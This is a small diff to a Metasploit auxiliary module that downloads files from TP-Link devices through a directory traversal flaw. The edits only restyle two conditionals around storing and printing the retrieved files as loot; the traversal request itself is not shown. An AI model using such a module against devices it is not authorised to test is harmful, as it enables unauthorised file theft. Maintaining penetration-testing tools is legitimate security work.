@@ -83,7 +83,7 @@ class MetasploitModule < Msf::Auxiliary
       loot = store_loot("tplink.traversal.data","text/plain",rhost, res.body,file)
       vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")
 
-      if datastore['VERBOSE']
+      if datastore['VERBOSE'] == true
         vprint_good("#{rhost}:#{rport} - Response - File #{file}:")
         res.body.each_line do |line|
           # the following is the last line of the useless response
@@ -108,7 +108,7 @@ class MetasploitModule < Msf::Auxiliary
         end
         out = false
       end
-    elsif res && res.code
+    elsif (res and res.code)
       vprint_error("#{rhost}:#{rport} - File->#{file} not found")
     end
   end
